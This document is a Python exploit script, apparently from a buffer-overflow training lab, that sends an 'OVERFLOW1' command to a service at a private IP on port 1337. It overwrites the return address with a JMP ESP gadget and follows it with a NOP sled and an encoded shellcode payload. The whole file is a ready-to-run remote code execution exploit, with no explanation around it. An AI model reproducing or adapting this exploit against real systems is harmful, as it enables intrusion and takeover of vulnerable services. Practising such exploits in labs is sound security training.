#!/usr/bin/env python3
import socket

ip = "10.10.93.88"
port = 1337
prefix = "OVERFLOW1 "
offset = 1978
overflow = "A" * offset
# 625011AF   FFE4             JMP ESP
retn = "\xaf\x11\x50\x62"
padding = "\x90" * 16
# !mona bytearray -b "\x00\x07\x2e\xa0"
payload = ("\xb8\x1a\x36\x5c\xad\xdb\xdd\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"
"\x52\x31\x43\x12\x03\x43\x12\x83\xf1\xca\xbe\x58\xf9\xdb\xbd"
"\xa3\x01\x1c\xa2\x2a\xe4\x2d\xe2\x49\x6d\x1d\xd2\x1a\x23\x92"
"\x99\x4f\xd7\x21\xef\x47\xd8\x82\x5a\xbe\xd7\x13\xf6\x82\x76"
"\x90\x05\xd7\x58\xa9\xc5\x2a\x99\xee\x38\xc6\xcb\xa7\x37\x75"
"\xfb\xcc\x02\x46\x70\x9e\x83\xce\x65\x57\xa5\xff\x38\xe3\xfc"
"\xdf\xbb\x20\x75\x56\xa3\x25\xb0\x20\x58\x9d\x4e\xb3\x88\xef"
"\xaf\x18\xf5\xdf\x5d\x60\x32\xe7\xbd\x17\x4a\x1b\x43\x20\x89"
"\x61\x9f\xa5\x09\xc1\x54\x1d\xf5\xf3\xb9\xf8\x7e\xff\x76\x8e"
"\xd8\x1c\x88\x43\x53\x18\x01\x62\xb3\xa8\x51\x41\x17\xf0\x02"
"\xe8\x0e\x5c\xe4\x15\x50\x3f\x59\xb0\x1b\xd2\x8e\xc9\x46\xbb"
"\x63\xe0\x78\x3b\xec\x73\x0b\x09\xb3\x2f\x83\x21\x3c\xf6\x54"
"\x45\x17\x4e\xca\xb8\x98\xaf\xc3\x7e\xcc\xff\x7b\x56\x6d\x94"
"\x7b\x57\xb8\x3b\x2b\xf7\x13\xfc\x9b\xb7\xc3\x94\xf1\x37\x3b"
"\x84\xfa\x9d\x54\x2f\x01\x76\x51\xb8\x16\x87\x0d\xba\x28\x96"
"\x91\x33\xce\xf2\x39\x12\x59\x6b\xa3\x3f\x11\x0a\x2c\xea\x5c"
"\x0c\xa6\x19\xa1\xc3\x4f\x57\xb1\xb4\xbf\x22\xeb\x13\xbf\x98"
"\x83\xf8\x52\x47\x53\x76\x4f\xd0\x04\xdf\xa1\x29\xc0\xcd\x98"
"\x83\xf6\x0f\x7c\xeb\xb2\xcb\xbd\xf2\x3b\x99\xfa\xd0\x2b\x67"
"\x02\x5d\x1f\x37\x55\x0b\xc9\xf1\x0f\xfd\xa3\xab\xfc\x57\x23"
"\x2d\xcf\x67\x35\x32\x1a\x1e\xd9\x83\xf3\x67\xe6\x2c\x94\x6f"
"\x9f\x50\x04\x8f\x4a\xd1\x24\x72\x5e\x2c\xcd\x2b\x0b\x8d\x90"
"\xcb\xe6\xd2\xac\x4f\x02\xab\x4a\x4f\x67\xae\x17\xd7\x94\xc2"
"\x08\xb2\x9a\x71\x28\x97")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(bytes(buffer + "\r\n", "latin-1"))
    print("Done!")
except:
    print("Could not connect.")